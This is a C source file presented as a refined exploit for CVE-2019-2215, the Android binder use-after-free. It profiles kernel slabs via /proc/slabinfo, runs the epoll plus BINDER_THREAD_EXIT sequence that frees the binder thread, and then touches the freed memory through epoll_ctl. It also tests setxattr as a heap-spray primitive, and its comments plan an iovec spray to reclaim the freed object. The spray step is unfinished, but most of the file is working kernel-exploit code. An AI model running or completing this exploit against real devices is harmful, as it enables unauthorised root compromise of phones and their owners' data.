/*
 * binder_uaf2.c — Refined CVE-2019-2215 exploit
 * - Comprehensive slab identification
 * - Correct trigger sequence (same thread for epoll + thread_exit)
 * - iovec spray for controlled reclaim
 */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>

#ifndef __NR_setxattr
#define __NR_setxattr 226
#endif

#define BINDER_WRITE_READ    _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT   _IOW('b', 8, int32_t)
#define BINDER_VERSION       _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version { signed long protocol_version; };

#define BC_ENTER_LOOPER 0x630c
#define BINDER_MMAP_SIZE (128 * 1024)

struct slab_entry { char name[64]; long active; long total; long objsize; };

static int read_all_slabs(struct slab_entry *e, int max) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return 0;
    char line[512];
    fgets(line, sizeof(line), f);
    fgets(line, sizeof(line), f);
    int n = 0;
    while (fgets(line, sizeof(line), f) && n < max) {
        sscanf(line, "%63s %ld %ld %ld",
               e[n].name, &e[n].active, &e[n].total, &e[n].objsize);
        n++;
    }
    fclose(f);
    return n;
}

static void slab_diff(struct slab_entry *before, int nb,
                       struct slab_entry *after, int na, int threshold) {
    for (int i = 0; i < nb; i++) {
        for (int j = 0; j < na; j++) {
            if (strcmp(before[i].name, after[j].name) == 0) {
                long diff = after[j].active - before[i].active;
                if (abs((int)diff) >= threshold)
                    printf("  %-40s %+ld (objsz=%ld)\n",
                           before[i].name, diff, before[i].objsize);
                break;
            }
        }
    }
}

int main(void) {
    printf("=== CVE-2019-2215 Refined Exploit ===\n\n");

    /* TEST 1: Full slab diff for binder thread identification */
    printf("--- Binder thread slab identification ---\n");
    {
        struct slab_entry before[200], after[200];
        int nb = read_all_slabs(before, 200);

        /* Open 50 binder connections (each creates proc + thread) */
        int fds[50];
        void *maps[50];
        int count = 0;
        for (int i = 0; i < 50; i++) {
            fds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (fds[i] < 0) break;
            maps[i] = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                          MAP_PRIVATE, fds[i], 0);
            if (maps[i] == MAP_FAILED) { close(fds[i]); break; }

            /* Create thread via ioctl */
            uint32_t cmd = BC_ENTER_LOOPER;
            struct binder_write_read bwr = {0};
            bwr.write_buffer = (unsigned long)&cmd;
            bwr.write_size = sizeof(cmd);
            ioctl(fds[i], BINDER_WRITE_READ, &bwr);
            count++;
        }
        printf("Created %d binder connections\n", count);

        int na = read_all_slabs(after, 200);
        printf("Slab changes (threshold=5):\n");
        slab_diff(before, nb, after, na, 5);

        /* Close all and diff */
        for (int i = 0; i < count; i++) {
            munmap(maps[i], BINDER_MMAP_SIZE);
            close(fds[i]);
        }

        int nf = read_all_slabs(after, 200);
        printf("\nAfter closing all:\n");
        slab_diff(before, nb, after, nf, 5);
    }

    /* TEST 2: Correct CVE-2019-2215 trigger sequence */
    printf("\n--- CVE-2019-2215 trigger sequence ---\n");
    {
        int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (binder_fd < 0) { perror("binder"); return 1; }

        void *map = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                        MAP_PRIVATE, binder_fd, 0);
        if (map == MAP_FAILED) { perror("mmap"); return 1; }

        uint32_t max_threads = 0;
        ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);

        printf("[+] Binder: fd=%d map=%p\n", binder_fd, map);

        /* Create epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };

        /* Add binder to epoll — this calls binder_poll which creates
         * a binder_thread for THIS thread and adds thread->wait to epoll */
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
            printf("[-] epoll_ctl: %s\n", strerror(errno));
            return 1;
        }
        printf("[+] Binder added to epoll (binder_thread created with wait entry)\n");

        /* Now exit the binder thread — this frees the binder_thread struct
         * but does NOT remove the wait entry from epoll! */
        int32_t dummy = 0;
        if (ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy) < 0) {
            printf("[-] THREAD_EXIT: %s\n", strerror(errno));
        } else {
            printf("[+] BINDER_THREAD_EXIT succeeded — binder_thread FREED!\n");
            printf("    epoll still has dangling reference to freed memory\n");
        }

        /* At this point, the binder_thread is freed but epoll's wait_queue
         * still references it. We need to:
         * 1. Spray controlled data into the freed slot
         * 2. Trigger epoll to access the freed memory
         */

        /* Check slab state before and after the spray */
        printf("\n[*] Now spraying to reclaim freed binder_thread slot...\n");

        /* The iovec spray technique:
         * writev() with a large iovec array causes the kernel to kmalloc
         * the iovec array. The size must match binder_thread.
         *
         * struct iovec = 8 bytes on ARM32
         * For kmalloc-N: need iovcnt * 8 = N
         *
         * We need to determine binder_thread size first.
         * On kernel 3.10, binder_thread has:
         *   - struct rb_node rb_node (12)
         *   - struct binder_proc *proc (4)
         *   - struct binder_transaction *transaction_stack (4)
         *   - struct list_head todo (8)
         *   - struct rb_root refs (4)
         *   - pid_t pid (4)
         *   - int looper (4)
         *   - struct binder_transaction *looper_need_return (4)
         *   - uint32_t return_error, return_error2 (8)
         *   - wait_queue_head_t wait (12 on ARM32: spinlock + list_head)
         *   - struct binder_stats stats (large...)
         * Total: probably 300-500 bytes → kmalloc-512 or kmalloc-1024
         */

        /* Try writev with different iovec counts to match potential sizes */
        int pipe_fds[2];
        pipe(pipe_fds);

        /* We don't know the exact size yet, so let's measure first */
        printf("[*] Need slab identification first — skipping spray for now\n");

        /* Safe cleanup: remove from epoll FIRST, then close */
        printf("\n[*] Cleaning up safely...\n");
        /* The epoll_ctl DEL will access the freed wait entry!
         * This IS the UAF trigger — but since we didn't spray,
         * the freed memory likely still has valid-ish data (not reused yet) */
        int r = epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);
        printf("  epoll_ctl DEL: %d (errno=%d)\n", r, r < 0 ? errno : 0);

        close(binder_fd);
        close(epfd);
        close(pipe_fds[0]);
        close(pipe_fds[1]);
    }

    /* TEST 3: setxattr as spray primitive */
    printf("\n--- setxattr spray test ---\n");
    {
        /* Test if setxattr syscall works on ext4 in /data/local/tmp */
        char data[512];
        memset(data, 'A', sizeof(data));

        int r = syscall(__NR_setxattr, "/data/local/tmp/xx",
                       "user.test", data, 256, 0);
        printf("  setxattr(256 bytes): %d (errno=%d %s)\n",
               r, r < 0 ? errno : 0, r < 0 ? strerror(errno) : "OK");

        r = syscall(__NR_setxattr, "/data/local/tmp/xx",
                       "user.test2", data, 512, 0);
        printf("  setxattr(512 bytes): %d (errno=%d %s)\n",
               r, r < 0 ? errno : 0, r < 0 ? strerror(errno) : "OK");

        /* Also check if we can do setxattr in a tight loop for spraying */
        if (r == 0 || errno == ENOTSUP || errno == EOPNOTSUPP) {
            printf("  setxattr available as spray primitive: %s\n",
                   r == 0 ? "YES" : "NO (not supported)");
        }
    }

    printf("\n=== Done ===\n");
    return 0;
}
